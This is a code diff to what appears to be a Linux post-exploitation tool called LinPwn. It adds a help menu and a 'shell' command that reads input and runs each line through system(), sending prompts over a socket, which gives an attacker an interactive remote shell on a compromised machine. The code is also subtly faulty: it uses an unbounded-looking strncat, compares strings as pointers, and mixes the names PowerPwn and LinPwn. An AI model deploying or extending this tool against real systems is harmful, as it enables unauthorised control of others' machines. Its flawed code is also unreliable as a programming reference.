@@ -21,6 +21,11 @@ void get_input(char input[BUFFER]) {
     input[strcspn(input, "\n")] = 0;
 }
 
+void new_line(void) {
+    std::string newline = "\n";
+    write(sd(), newline.data(), newline.length());
+}
+
 void green(void) {
     std::string green = "\x1b[32m";
     write(sd(), green.data(), green.length());
@@ -31,6 +36,50 @@ void red(void) {
     write(sd(), red.data(), red.length());
 }
 
+void seperator(void) {
+    std::string seperate = "====================================="
+        "======================================\n";
+    write(sd(), seperate.data(), seperate.length());
+}
+
+void help(void) {
+    std::string cmds_list = "Commands\n";
+    std::string shell = "shell\n";
+    std::string exit = "exit\n";
+    std::string help = "help\n";
+
+    new_line();
+    green();
+    write(sd(), cmds_list.data(), cmds_list.length());
+    seperator();
+    write(sd(), shell.data(), shell.length());
+    write(sd(), exit.data(), exit.length());
+    write(sd(), help.data(), help.length());
+
+}
+
+void shell() {
+    std::string shell = "\x1b[31m(PowerPwn: Shell) > ";
+    std::string exe = "\x1b[32mExecuting /bin/sh\n";
+    std::string exits = "Type exit to return to LinPwn.\n";
+    char option[BUFFER];
+    const char *errors = " 2>&0";
+    write(sd(), exe.data(), exe.length());
+    write(sd(), exits.data(), exits.length());
+
+    for (;;) {
+        write(sd(), shell.data(), shell.length());
+        green();
+        get_input(option);
+
+        if (strncmp(option, "exit\0", 5) == 0) {
+            break;
+        } else {
+            strncat(option, errors, BUFFER);
+            system(option);
+        }
+    }
+}
 
 int options(void) {
     struct commands *cmd = NULL;
@@ -39,11 +88,16 @@ int options(void) {
     cmd = (commands*)malloc(sizeof(struct commands));
     get_input(option);
 
+    cmd->shell = "shell";
     cmd->exit = "exit";
+    cmd->help = "help";
 
-    if (option == cmd->exit) {
+    if (option == cmd->exit)
         return 1;
-    }
+    else if (option == cmd->help)
+        help();
+    else if (option == cmd->shell)
+        shell();
 
     return 0;
 }
